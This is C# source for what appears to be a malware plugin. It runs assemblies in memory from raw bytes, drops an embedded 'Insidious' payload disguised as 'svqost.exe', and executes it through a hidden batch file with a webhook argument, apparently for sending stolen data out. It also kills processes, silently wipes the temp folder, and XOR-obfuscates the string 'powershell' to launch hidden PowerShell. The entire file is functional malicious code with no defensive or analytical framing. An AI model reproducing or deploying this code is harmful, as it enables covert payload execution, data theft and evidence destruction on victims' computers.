using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Plugin.Handle
{
    class HandleStS
    {


        public void Start(string webhook)
        {
            Task thread1 = Task.Factory.StartNew(() => fun1(webhook));
            Task.WaitAll(thread1);
        }
        public static void Execute(byte[] purdi)
        {
            try
            {
                Assembly asm = AppDomain.CurrentDomain.Load((byte[])purdi);
                MethodInfo Metinf = Entry(asm);
                object InjObj = asm.CreateInstance(Metinf.Name);
                object[] parameters = new object[1];
                if (Metinf.GetParameters().Length == 0)
                    parameters = null;
                MethodInfo(Metinf, InjObj, parameters);
            }
            catch { }
        }
        private static object MethodInfo(MethodInfo meth, object obj1, object[] obj2)
        {
            if (meth != null)
                return meth.Invoke(obj1, obj2);
            else
                return false;
        }
        private static MethodInfo Entry(Assembly obj)
        {
            if (obj != null)
                return obj.EntryPoint;
            else
                return null;
        }
        public void fun1(string webhook)
        {
            string exe = Path.Combine(Path.GetTempPath(), "svqost.exe");
            string exbat = Path.Combine(Path.GetTempPath(), "exec.bat");
            string exlog = Path.Combine(Path.GetTempPath(), "log.txt");
            File.WriteAllBytes(exe, Properties.Resources.Insidious);
            System.IO.StreamWriter file = new System.IO.StreamWriter(Path.Combine(Path.GetTempPath(), "exec.bat"));
            file.WriteLine("set exeFile=" + exe);
            file.WriteLine("set logFile=" + exlog);
            file.WriteLine("%exeFile%  " + Convert.ToString(webhook) + " > %logFile%"); ;
            file.Close();
            string chv = Path.Combine(Path.Combine(Path.GetTempPath(), "exec.bat"));
            Process.Start(new ProcessStartInfo
            {
                FileName = chv,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            }).WaitForExit();

        }
        public  void fun2()
        {
            Stop();
            cleantemp();
            cleantempForce();
        }

        public void Stop()
        {


            foreach (Process proc in Process.GetProcessesByName("Insidious"))
            {
                proc.Kill();
            }
            foreach (Process proc in Process.GetProcessesByName("insidious"))
            {
                proc.Kill();
            }
            foreach (Process proc in Process.GetProcessesByName("cmd"))
            {
                proc.Kill();
            }
            foreach (Process proc in Process.GetProcessesByName("svqost"))
            {
                proc.Kill();
            }
            foreach (Process proc in Process.GetProcessesByName("conhost"))
            {
                proc.Kill();
            }
            cleantemp();
            cleantempForce();
        }
        public void cleantempForce()
        {
            System.IO.DirectoryInfo di = new DirectoryInfo(Path.GetTempFileName());

            foreach (FileInfo file in di.GetFiles())
            {
                file.Delete();
            }
            foreach (DirectoryInfo dir in di.GetDirectories())
            {
                dir.Delete(true);
            }

        }
        public static void DeleteDirectory(string target_dir)
        {
            string[] files = Directory.GetFiles(target_dir);
            string[] dirs = Directory.GetDirectories(target_dir);

            foreach (string file in files)
            {
                File.SetAttributes(file, FileAttributes.Normal);
                File.Delete(file);
            }

            foreach (string dir in dirs)
            {
                DeleteDirectory(dir);
            }

            Directory.Delete(target_dir, false);
        }

        public static void cleantemp()
        {

            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/k start /b del /q/f/s %TEMP%\\* & exit",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            });

        }
        public static void PS(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }
        public static void RunPS(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = thebook("ze}oxyboff"),
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }
        public static string thebook(string str)
        {
            char ch1 = '\n';
            StringBuilder stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                char ch2 = (char)(num ^ ch1);
                stringBuilder.Append(ch2);
            }
            return stringBuilder.ToString();
        }
 
    }
}
